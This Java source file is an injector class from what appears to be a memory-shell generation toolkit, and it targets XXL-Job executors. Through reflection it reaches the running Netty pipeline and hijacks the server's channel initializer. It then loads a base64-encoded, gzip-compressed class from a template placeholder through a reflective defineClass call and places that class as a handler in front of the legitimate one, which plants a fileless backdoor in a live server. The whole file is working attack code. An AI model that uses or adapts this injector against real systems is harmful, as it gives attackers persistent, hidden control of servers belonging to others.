package com.reajason.javaweb.memshell.injector.xxljob;

import com.xxl.job.core.biz.impl.ExecutorBizImpl;
import com.xxl.job.core.server.EmbedServer;
import io.netty.channel.ChannelHandler;
import io.netty.channel.ChannelInitializer;
import io.netty.channel.socket.SocketChannel;
import io.netty.handler.codec.http.HttpObjectAggregator;
import io.netty.handler.codec.http.HttpServerCodec;
import io.netty.handler.timeout.IdleStateHandler;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 * @since 2025/1/21
 */
public class XxlJobNettyHandlerInjector extends ChannelInitializer<SocketChannel> {
    private String msg = "";

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() throws IOException {
        return "{{base64Str}}";
    }

    public XxlJobNettyHandlerInjector() {
        Object context = null;
        try {
            context = getContext();
        } catch (Throwable e) {
            msg += "context error: " + getErrorMessage(e);
        }
        try {
            handlerClass = getShellClass(context);
            msg += "context: [" + context + "] ";
            inject(context);
            msg += "[/*] ready\n";
        } catch (Throwable e) {
            msg += "failed " + getErrorMessage(e) + "\n";
        }
        System.out.println(msg);
    }

    @Override
    public String toString() {
        return msg;
    }

    private Class<?> handlerClass;

    @Override
    protected void initChannel(SocketChannel channel) throws Exception {
        ChannelHandler channelHandler = (ChannelHandler) handlerClass.newInstance();
        channel.pipeline()
                .addLast(new IdleStateHandler(0, 0, 30 * 3, TimeUnit.SECONDS))
                .addLast(new HttpServerCodec())
                .addLast(new HttpObjectAggregator(5 * 1024 * 1024))
                .addLast(channelHandler)
                .addLast(new EmbedServer.EmbedHttpServerHandler(new ExecutorBizImpl(), "", new ThreadPoolExecutor(
                        0,
                        200,
                        60L,
                        TimeUnit.SECONDS,
                        new LinkedBlockingQueue<>(2000),
                        r -> new Thread(r, "xxl-rpc, EmbedServer bizThreadPool-" + r.hashCode()),
                        (r, executor) -> {
                            throw new RuntimeException("xxl-job, EmbedServer bizThreadPool is EXHAUSTED!");
                        })));
    }

    private Class<?> getShellClass(Object context) throws Exception {
        ClassLoader classLoader = context.getClass().getClassLoader();
        try {
            return classLoader.loadClass(getClassName());
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            return (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
        }
    }

    public Object getContext() throws Exception {
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            if (thread == null
                    || !thread.getName().contains("nioEventLoopGroup")) {
                continue;
            }
            Object target = getFieldValue(getFieldValue(getFieldValue(thread, "target"), "runnable"), "val$eventExecutor");
            if (target.getClass().getName().endsWith("NioEventLoop")) {
                HashSet<?> set = (HashSet<?>) getFieldValue(getFieldValue(target, "unwrappedSelector"), "keys");
                Object keys = set.toArray()[0];
                return getFieldValue(getFieldValue(keys, "attachment"), "pipeline");
            }
        }
        return null;
    }

    public void inject(Object pipeline) throws Exception {
        Object embedHttpServerHandler = getFieldValue(getFieldValue(getFieldValue(pipeline, "head"), "next"), "handler");
        setFieldValue(embedHttpServerHandler, "childHandler", this);
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;

        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
        } finally {
            if (gzipInputStream != null) {
                try {
                    gzipInputStream.close();
                } catch (IOException ignored) {
                }
            }
            out.close();
        }
        return out.toByteArray();
    }

    public Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null) {
                field = getField(clazz.getSuperclass(), fieldName);
            }
        }
        return field;
    }

    public Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
